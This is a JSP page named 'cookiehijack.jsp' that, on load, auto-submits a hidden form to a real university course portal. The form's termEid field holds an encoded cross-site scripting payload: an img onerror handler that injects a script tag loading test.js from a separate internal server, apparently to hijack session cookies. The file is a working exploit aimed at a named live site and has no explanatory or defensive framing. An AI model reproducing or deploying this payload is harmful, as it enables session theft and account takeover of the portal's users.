<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <base href="<%=basePath%>">
    
    <title>My JSP 'cookiehijack.jsp' starting page</title>
    
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">    
	<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
	<meta http-equiv="description" content="This is my page">
	<!--
	<link rel="stylesheet" type="text/css" href="styles.css">
	-->
	<script src="https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"></script>
  </head>
  
  <body>
   	<form id="hijack" method="post" action="http://course.ucas.ac.cn/portal/plogin/main.do?method=gotoOuterMain" target="mainContent">
    	<input type="hidden" name="type" value="active">
    	<input type="hidden" name="siteId" value="公共政策与管理学院">
    	<input type="hidden" name="searchText" value="">
    	<input type="hidden" name="termEid" value="&quot;&gt;&lt;img src=a onerror=&quot;document.write(&#x27;&lt;&#x27;);document.write(&#x27;script src=http://10.202.14.167:8080/IRS_news/js/test.js&gt;&lt;/Script&gt;&#x27;)&quot;&gt;">
		<!-- <button type="submit">click me!</button> -->
    </form>
  	<iframe id="mainContent" name="mainContent" scrolling="auto" style="height: 807px;" width="100%" height="100%" frameborder="0">
  	</iframe>

    <script type="text/javascript">
    	
      	$(document).ready(function(){
    		$("form#hijack").submit();
    	});    	
    	/*window.location="https://www.baidu.com"; */
    </script>
  </body>
</html>
